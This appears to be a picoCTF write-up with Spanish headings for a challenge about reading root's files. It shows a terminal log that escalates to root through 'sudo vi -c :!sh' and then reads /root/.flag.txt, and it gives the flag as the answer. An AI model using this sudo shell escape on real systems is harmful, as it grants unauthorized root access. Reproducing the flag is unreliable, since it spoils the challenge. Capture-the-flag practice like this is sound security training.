## Descripción:
Can you read files in the root file?

Additional details will be available after launching your challenge instance.

# Solución
```bash
picoplayer@challenge:~$ sudo /usr/bin/vi -c ':!sh'

# id
cat /root/flag.txt
uid=0(root) gid=0(root) groups=0(root)
# cat: /root/flag.txt: No such file or directory
# ^C
# ls -la /root
ls -la /home
ls -la /home/* 2>/dev/null
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Sep 16 03:01 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# total 0
drwxr-xr-x 1 root       root       24 Aug  4  2023 .
drwxr-xr-x 1 root       root       51 Sep 16 03:01 ..
drwxr-xr-x 1 picoplayer picoplayer 20 Sep 16 03:02 picoplayer
# total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Sep 16 03:02 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Sep 16 03:02 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
# ^C
# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
# ^C
# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```
Respuesta:`picoCTF{uS1ng_v1m_3dit0r_55878b51}`
## Notas

## Referencias
 